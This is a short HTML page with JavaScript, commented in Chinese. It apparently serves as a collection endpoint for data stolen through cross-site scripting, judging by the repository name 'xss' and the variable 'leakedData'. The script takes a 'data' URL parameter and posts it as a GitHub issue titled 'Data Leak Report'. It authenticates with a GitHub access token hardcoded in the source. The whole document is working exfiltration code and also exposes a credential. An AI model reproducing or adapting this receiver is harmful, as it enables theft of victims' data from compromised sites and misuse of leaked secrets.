<!DOCTYPE html>
<script>
  // 捕获 URL 中的查询参数
  const params = new URLSearchParams(window.location.search);
  const leakedData = params.get('data') || 'No data leaked';

  // 调用 GitHub API 创建 Issue
  fetch('https://api.github.com/repos/G0mini/xss/issues', {
    method: 'POST',
    headers: {
      'Authorization': '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', // 替换为有效 Token
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      title: 'Data Leak Report',
      body: `泄漏数据：${leakedData}`
    })
  }).then(response => {
    if (response.ok) {
      alert('数据已记录到 GitHub Issues！');
    } else {
      alert('记录失败，请检查 Token 权限。');
    }
  });
</script>
